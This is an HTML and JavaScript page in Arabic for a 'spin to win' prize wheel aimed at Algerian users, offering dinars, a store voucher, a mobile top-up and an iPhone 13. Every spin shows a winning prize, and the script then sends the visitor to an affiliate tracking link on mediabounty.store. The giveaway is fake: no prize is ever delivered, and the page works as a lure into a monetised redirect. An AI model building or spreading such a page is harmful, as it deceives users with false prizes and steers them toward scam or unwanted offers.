<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>عجلة الحظ - اربح الآن!</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      text-align: center;
      background: #f7f9fb;
      direction: rtl;
      margin: 0;
      padding: 0;
    }

    h1 {
      margin-top: 25px;
      color: #2c3e50;
      font-size: 24px;
      padding: 0 10px;
    }

    #wheelContainer {
      position: relative;
      margin: 30px auto;
      width: 90vw;
      max-width: 380px;
      height: 90vw;
      max-height: 380px;
    }

    #wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 6px solid #3498db;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
      transition: transform 5s ease-out;
    }

    #pointer {
      width: 0;
      height: 0;
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-bottom: 30px solid #e74c3c;
      position: absolute;
      top: -25px;
      left: 50%;
      transform: translateX(-50%);
    }

    #spinBtn {
      margin-top: 20px;
      padding: 15px 40px;
      font-size: 20px;
      background-color: #27ae60;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    #spinBtn:hover {
      background-color: #219150;
    }

    #result {
      margin-top: 25px;
      font-size: 22px;
      font-weight: bold;
      color: #2980b9;
      min-height: 30px;
    }
  </style>
</head>
<body>

  <h1>🎉 لف عجلة الحظ واربح جائزتك!</h1>

  <div id="wheelContainer">
    <div id="pointer"></div>
    <canvas id="wheel" width="380" height="380"></canvas>
  </div>

  <button id="spinBtn">اضغط للّف 🔄</button>
  <div id="result"></div>

  <audio id="spinSound">
    <source src="https://cdn.pixabay.com/download/audio/2023/01/03/audio_8e604dcab5.mp3?filename=spin-wheel-113441.mp3" type="audio/mp3">
  </audio>

  <script>
    const canvas = document.getElementById("wheel");
    const ctx = canvas.getContext("2d");
    const spinBtn = document.getElementById("spinBtn");
    const resultTxt = document.getElementById("result");
    const spinSound = document.getElementById("spinSound");

    const prizes = [
      "750 دينار",
      "قسيمة واو ستور",
      "iPhone 13",
      "فليكسي 200 دج"
    ];

    const redirectURL = "https://max1.mediabounty.store/?utm_medium=d308d4787ec0c51d28dd7a7200809469206e4253&utm_campaign=target_DZ_d918a6";

    const colors = ["#74b9ff", "#ffeaa7", "#81ecec", "#fab1a0"];
    const arc = 2 * Math.PI / prizes.length;

    function drawWheel() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      for (let i = 0; i < prizes.length; i++) {
        const start = i * arc;
        const end = start + arc;

        ctx.beginPath();
        ctx.fillStyle = colors[i];
        ctx.moveTo(190, 190);
        ctx.arc(190, 190, 190, start, end);
        ctx.fill();

        ctx.save();
        ctx.translate(190, 190);
        ctx.rotate(start + arc / 2);
        ctx.textAlign = "center";
        ctx.fillStyle = "#2c3e50";
        ctx.font = "bold 20px Cairo";
        ctx.fillText(prizes[i], 110, 10);
        ctx.restore();
      }
    }

    drawWheel();

    spinBtn.addEventListener("click", () => {
      spinBtn.disabled = true;
      resultTxt.textContent = "⏳ جاري تدوير العجلة...";
      spinSound.currentTime = 0;
      spinSound.play();

      const randomSpin = Math.floor(Math.random() * prizes.length);
      const spins = 5;
      const degreesPerSegment = 360 / prizes.length;
      const finalAngle = (spins * 360) + (randomSpin * degreesPerSegment) + (degreesPerSegment / 2);

      canvas.style.transition = "transform 5s ease-out";
      canvas.style.transform = `rotate(${finalAngle}deg)`;

      setTimeout(() => {
        resultTxt.textContent = `🎁 ${prizes[randomSpin]}!`;
        setTimeout(() => window.location.href = redirectURL, 2500);
      }, 5200);
    });
  </script>

</body>
</html>
